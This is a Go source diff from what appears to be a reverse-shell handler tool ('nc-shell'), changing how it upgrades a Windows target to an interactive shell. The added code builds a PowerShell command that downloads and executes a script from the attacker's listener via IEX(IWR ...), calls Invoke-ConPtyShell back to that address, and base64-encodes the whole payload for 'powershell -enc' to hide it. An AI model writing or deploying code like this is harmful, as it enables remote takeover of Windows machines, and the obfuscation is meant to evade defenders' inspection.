@@ -2,7 +2,6 @@ package terminal
 
 import (
 	"bytes"
-	"fmt"
 	"io"
 	"log"
 	utils "nc-shell/src/utils"
@@ -306,8 +305,10 @@ func (terminal *Terminal) interactiveReverseShellLinux() {
 
 func (terminal *Terminal) interactiveReverseShellWindows() {
 	terminal.getTerminalSize()
-	command := `powershell IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
+	payloadPowershell := `IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
+	payloadPowershell, _ = utils.Utf16leBase64(payloadPowershell)
+	command := "powershell -enc " + payloadPowershell
 	terminal.Log.Debug("Send the command: " + command)
-	terminal.execute(command)
+	terminal.execute(command, []byte{promptWindows1})
 	terminal.Con.Close()
 }
